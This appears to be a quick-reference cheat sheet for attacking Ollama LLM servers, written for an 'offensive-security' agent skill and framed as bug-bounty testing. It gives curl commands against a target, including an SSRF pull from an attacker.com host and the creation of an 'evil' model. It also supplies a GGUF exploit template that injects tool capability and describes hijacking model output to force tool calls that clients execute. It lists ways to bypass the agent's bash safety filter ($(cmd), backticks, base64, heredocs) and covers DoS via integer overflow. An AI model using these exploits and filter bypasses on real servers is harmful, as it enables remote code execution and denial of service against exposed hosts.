# Ollama LLM Server Security Testing — Quick Reference

**For use with the `offensive-security` skill — ML Model/Server Security Testing section**

---

## Quick Commands

```bash
# Check Ollama version
curl http://TARGET:11434/api/version

# List models + capabilities
curl -X POST http://TARGET:11434/api/tags

# Show model details (includes capabilities, template, model_info)
curl -X POST http://TARGET:11434/api/show -d '{"model": "model-name"}'

# Create model from GGUF (supply chain vector)
curl -X POST http://TARGET:11434/api/create \
  -H "Content-Type: application/json" \
  -d '{"model": "evil", "files": {"evil.gguf": "sha256:..."}}'

# Pull model (SSRF vector)
curl -X POST http://TARGET:11434/api/pull \
  -H "Content-Type: application/json" \
  -d '{"name": "http://attacker.com/malicious.gguf"}'
```

---

## Key Vulnerability Patterns

| Pattern | Location | Test |
|---------|----------|------|
| **chat_template capability injection** | `server/images.go:194` | Create GGUF with `tokenizer.chat_template` containing "tools" |
| **Weight hijack tool call** | Model output weights | Craft GGUF with output.weight peaked at tool-call token |
| **Integer overflow DoS** | 3x GGUF parsers | GGUF with UINT64_MAX string length / array count |
| **Dual pipeline** | Go template vs llama-server | Test same model on `/api/chat` vs `/v1/chat/completions` |
| **Agent TUI RCE** | v0.32.0+ `ollama agent --yolo` | Run with malicious model |

---

## Capability Detection Paths (v0.31.1+)

```go
// 5 independent paths granting CapabilityTools:
1. m.Config.Capabilities                          // Modelfile
2. tokenizer.chat_template KV contains "tools"    // GGUF KV
3. Go template .Vars() contains "tools"           // Modelfile TEMPLATE
4. builtinParser.HasToolSupport()                 // Built-in parser
5. model family == "gptoss"                       // Hardcoded
```

---

## GGUF Exploit Template (chat_template injection)

```python
# Minimal GGUF structure for capability injection
N_VOCAB = 260
tokens = [chr(i) for i in range(256)] + ["Ġ", "Ċ", "ĉ", TOOL_JSON]
bos_token_id = 257
eos_token_id = 258
target_token_id = 259  # Tool call JSON

KV = {
    "general.architecture": "llama",
    "tokenizer.ggml.model": "gpt2",
    "tokenizer.chat_template": "{{ .Tools }}",  # Contains "tools" → CapabilityTools
    # ... other required KVs
}
```

---

## Agent TUI (v0.32.0+) — New Attack Surface

```bash
# Full RCE via model-driven tool calls
ollama agent --yolo --model evil-model "hello"

# Tools auto-registered:
# - bash (shell exec)
# - read (file read, dir-confined)
# - edit (file write, dir-confined)
# - web_search (cloud proxy)
# - web_fetch (cloud proxy)

# Bash safety only blocks:
# - rm -rf on /, ~, system dirs
# - cat/less/etc on specific credential paths
# BYPASSES: $(cmd), `cmd`, base64, heredocs, shell builtins
```

---

## Version-Specific Notes

| Version | llama.cpp | Key Changes |
|---------|-----------|-------------|
| v0.24.0 | b3847 | Weight hijack works |
| v0.30.7 | b3847 | First chat_template cap injection |
| v0.31.1 | b9840 | detectChatTemplate rewritten, vocab validation stricter (weight hijack broken) |
| v0.31.2 | b9888 | Same as 0.31.1 |
| v0.32.0-rc0 | b9888 | **Agent TUI added**, `agent/tools/` package |

---

## Evidence Capture Checklist

- [ ] `POST /api/create` request with GGUF file
- [ ] `POST /api/show` response showing `"capabilities": ["completion", "tools"]` without Modelfile
- [ ] Client (OpenCode/Claude Code/Agent TUI) executing tool call from model output
- [ ] Ollama process OOM killed after malicious GGUF model list refresh
- [ ] Redirect chain from `/api/pull` showing SSRF
- [ ] `ollama agent --yolo` executing arbitrary command

---

## References

- Full audit: `references/ollama-llm-server-vulnerability-research.md`
- Shodan AI census: `references/shodan-ai-census.md` (Ollama 210K+ exposed)
- Bug bounty methodology: this skill's sub-skills (`bug-bounty-triage`, `bug-bounty-reporting`, `bug-bounty-evidence`)